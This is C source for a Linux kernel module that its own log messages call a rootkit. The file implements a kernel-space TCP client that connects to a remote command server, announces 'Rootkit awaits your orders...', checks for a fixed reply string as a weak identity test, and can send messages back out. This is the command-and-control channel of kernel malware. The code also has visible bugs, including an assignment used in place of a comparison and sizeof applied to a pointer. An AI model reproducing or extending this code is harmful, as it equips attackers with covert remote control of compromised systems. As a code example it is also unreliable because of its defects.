#include<linux/in.h>
#include<linux/inet.h>
#include<linux/socket.h>
#include<net/sock.h>


struct Server{
	struct sockaddr_in s_addr; 
	struct socket *sock;
	struct kvec sock_vec;
	struct msghdr sock_msg;
	char *message;
};

struct Server server;

int server_print(char *message);
/*basic functions without ability to authenticate*/
static int net_connect(char *ipaddr, int port){
	//  https://linux-kernel-labs.github.io/refs/heads/master/labs/networking.html
	int err;

	// kernel memory allocate a send and recieve buffer
	server.message = kmalloc(BUFFER_SIZE, GFP_KERNEL);
	if (server.message == NULL) {
		printk(KERN_DEBUG "client: buffer kmalloc error!\n");
		return -1;
	}

	//zeroes out the s_addr
	memset(&(server.s_addr), 0, sizeof(server.s_addr));

	server.s_addr.sin_family = AF_INET; //sets the family
	server.s_addr.sin_port = htons(port); //sets the port
	server.s_addr.sin_addr.s_addr = in_aton(ipaddr); //sets the adress
	server.sock = (struct socket *)kmalloc(sizeof(struct socket), GFP_KERNEL); //allocates memory to the socket

	//creates a socket- &init_net is the default network namespace
	err = sock_create_kern(&init_net, AF_INET, SOCK_STREAM, IPPROTO_TCP, &(server.sock));
	if (err < 0) {
		printk(KERN_DEBUG "[rootkit] server_connect:socket creation error!\n");
		return -1;
	}

	err = server.sock->ops->connect(server.sock, (struct sockaddr *)&(server.s_addr), sizeof(server.s_addr), 0);
	if (err != 0){
		printk(KERN_DEBUG "[rootkit] server_connect: error connecting!- %i\n", err);
		return -1;
	}
	printk(KERN_DEBUG "[rootkit] server_connect: connected to server");
	return 0;
} //connects to the server
static int net_send(void){
	//  https://linux-kernel-labs.github.io/refs/heads/master/labs/networking.html
	int err;
	if (strlen(server.message)==0){
		printk(KERN_DEBUG "[rootkit] net_send: no message!");
		return -1;
	}
	memset(&(server.sock_msg), 0, sizeof(server.sock_msg)); //zeroes out message buffer
	memset(&(server.sock_vec), 0, sizeof(server.sock_vec)); //zeroes out message vector
	server.sock_vec.iov_base = server.message; //sets the data to be sent
	server.sock_vec.iov_len = BUFFER_SIZE;
	// send data
	err = kernel_sendmsg(server.sock, &(server.sock_msg), &(server.sock_vec), 1, BUFFER_SIZE);
	printk("\n");
	if (err < 0) {
		printk(KERN_DEBUG "[rootkit] server_send: kernel_sendmsg error!\n");
		return err;
	}
	else if(err != BUFFER_SIZE){
		printk(KERN_DEBUG "[rootkit] server_send: err!=BUFFER_SIZE\n");
	}
	return 0;
} //sends message
static int net_recv(void){
	//  https://linux-kernel-labs.github.io/refs/heads/master/labs/networking.html
	int err;
	memset(server.message, 0, BUFFER_SIZE); //zeroes out message buffer
	memset(&(server.sock_msg), 0, sizeof(server.sock_msg)); //zeroes out message buffer
	memset(&(server.sock_vec), 0, sizeof(server.sock_vec)); //zeroes out message vector
	server.sock_vec.iov_base=server.message;
	server.sock_vec.iov_len=BUFFER_SIZE;
	err = kernel_recvmsg(server.sock, &(server.sock_msg), &(server.sock_vec), BUFFER_SIZE, BUFFER_SIZE, 0);
	if (err < 0){
		printk(KERN_DEBUG "[rootkit] server_recv: error recieving data");
		return -1;
	}
	return 0;
} //recieves message


static int server_connect(char *ipaddr, int port){
	//MQV handshake with server will go here, but for now using string for identity proof
	int connect_count = 0;
	while(net_connect(ipaddr, port)==-1 && connect_count++<100){
		printk(KERN_DEBUG "connection failed... retrying");
		if(connect_count=100){
			printk(KERN_DEBUG "connection failed!");
		}
	};
	memset(server.message, 0, sizeof(server.message));
	strcpy(server.message, "Rootkit awaits your orders...");
	net_send();
	net_recv();
	if (strcmp("Command has been expecting you...", server.message)){ //0 is same so if not zero then it is not the same
		printk(KERN_DEBUG "[rootkit] server_connect: server is a fake\n%s", server.message);
		return -1;
	}
	return 0;
}

int server_print(char *message){
	server.message = message;
	net_send();
	return 0;
}
